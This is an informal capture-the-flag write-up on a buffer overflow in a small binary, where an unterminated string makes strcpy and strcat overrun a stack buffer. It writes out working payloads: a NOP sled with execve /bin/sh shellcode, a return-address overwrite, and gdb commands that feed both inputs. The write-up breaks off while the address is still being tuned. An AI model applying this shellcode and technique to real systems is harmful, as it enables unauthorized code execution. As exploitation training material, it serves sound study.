Bonus time ! 

Ok so we have a function main, a p function and a pp function.

In terms of vulnerable functions we have a strcpy and strcat

There is no system calls so we'll bring our shellcode

First let's bring our pattern generator, and after two reads we get a crash with offset of 9, so we can take the whell and go whereever we want

That being said, a 10 long code does not crash

The pp call contains two p calls, each reading an input, replacing the \n ending the string with a \0a and copying the first 20 bytes into a 20 long buffer. So far all good.

But then there a strcpy call that copies the first of these two 20 bytes long buffer into our main buffer, 54 long.
Then repalce the \0 by a space and strcat the second buffer into our first.

Our exploit will lie in the fact that the strchr in p expects to find a \n to turn into a \0 to terminate the string and make sure the subsequent strcpy, strchr and strcat work properly.

But if there is no \n everyting goes bad.

At this point, the first 20 buffer will be filled with a non terminated string and the second one with whatever.

Calling strcpy on this will then take the first and second buffer since it won't know the first ending point, this is our entrypoint, we will be able to change the return address this way

We will attempt to store our shellcode into the big buffer on the first read, and on the second read we'll point towards it


First arg with a bunch of filler and the shellcode
python -c 'print ("\x90" * 1000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")' > /tmp/1

Second arg with enough filler to overflow and the address of our buffer

Big buffer is at 0xbfffe680

We know the offset is at 9 so :
AAAAAAAAABBBB 
but it does not crash, weird

```gdb
abcdefghijklmnopqrstuvwxyz
AAAAAAAAABBBBAAAAAAAabcdefghijklmnopqrst��� abcdefghijklmnopqrst���

Program received signal SIGSEGV, Segmentation fault.
0x6d6c6b6a in ?? ()
```

Ok so it appears it needs stuff afterwards, no problem


abcdefghi jklm nopqrstuvwxyz

Our address must be put in this range

0xbf ff e6 80
python -c 'print("A" * 9 + "\x80\xe6\xff\xbf" + "B" * 13)'

the gdb command will be :

r < <(cat /tmp/1 ; sleep 1; cat /tmp/2)
crashes us in 0xbfffe69a, we must go further to avoid the second read messing up our first


python -c 'print("A" * 9 + "\xff\xe6\xff\xbf" + "B" * 13)' > /tmp/2
r < <(cat /tmp/1 ; sleep 1; cat /tmp/2 -)
To see where we can crash with the second string
abcdefghi jklm nopqrstuv